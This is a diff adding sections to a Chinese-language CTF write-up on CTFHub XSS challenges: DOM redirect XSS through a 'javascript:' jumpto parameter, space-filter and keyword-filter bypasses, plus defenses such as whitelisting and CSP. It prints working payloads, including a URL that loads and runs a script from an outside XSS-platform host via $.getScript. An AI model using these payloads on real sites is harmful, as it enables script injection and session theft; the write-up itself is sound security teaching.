@@ -657,3 +657,51 @@ print(requests.get(burp0_url+quote(id), headers=burp0_headers).text)
    避免直接使用 `innerHTML`、`outerHTML`、`document.write()` 等 API。**替代方案**：使用 `textContent` 或 `setAttribute` 安全插入内容。
 
 2. 对输入内容进行转义，或者转义 `"` 和 `'`，并始终用引号包裹属性值。
+#### DOM跳转
+
+首先发现Jump to竟然不能输入，那就直接看源码吧
+
+![image-20250306103717559](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250306103717559.png)
+
+源码有个地方可以注入xss漏洞，这个代码挺好看懂，就是把这个这个位置的字符串分割，然后取url，进行跳转，那如果加入的是`location.href = "javascript:alert('xss')"`，这样的代码赋值给 `location.href` 时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它
+
+![image-20250306105332860](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250306105332860.png)
+
+然后构造url来加载xss的代码
+`http://challenge-4c73fedfa0ff45bb.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript("//uj.ci/vxa")`。需要理解这段代码的，这段代码使用了 jQuery 的 `$.getScript()` 函数来异步加载并执行来自 xss平台 的 js 脚本。最后就拿到flag了
+
+![image-20250306110650284](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250306110650284.png)
+
+防御：
+
+1.**避免直接使用用户输入控制跳转**
+
+白名单验证（只能跳转到可信的域名）、协议过滤，禁止使用`javascript：`
+
+2.**转义动态生成的URL**：对用户的输入进行转义，比如“、‘，这样子就会把一些无效协议拦截在外
+
+3.**内容安全策略（CSP）**:限制页面跳转或者脚本执行，
+
+``````html
+Content-Security-Policy: 
+  default-src 'self'; 
+  script-src 'self' 'unsafe-inline' 'unsafe-eval'; 
+  navigate-to 'self' https://trusted-site.com;
+``````
+
+- **`navigate-to`**：限制页面跳转的目标（仅允许跳转到 `self` 或指定域名）。
+- **`script-src`**：禁止内联脚本（移除 `'unsafe-inline'`）和动态代码执行（移除 `'unsafe-eval'`）。
+
+#### 过滤空格
+
+这个就是在xss注入的时候把空格过滤了，所以我们只需要把空格注释或者转义一下就可以了
+
+![image-20250306205720470](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250306205720470.png)
+
+那只需要把代码改成`<script>/**/alert(123);<\script>`，即可，我还尝试了其他的绕过空格过滤的，比如\n,\t,\\u0020，都不可以，可能是js不支持这种形式把
+
+#### 过滤关键词
+
+可以看到题目把script这个关键词给ban了，所以需要其他办法，可以通过大小写、双写绕过`scrscriptipt`
+
+![image-20250306212450542](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250306212450542.png)
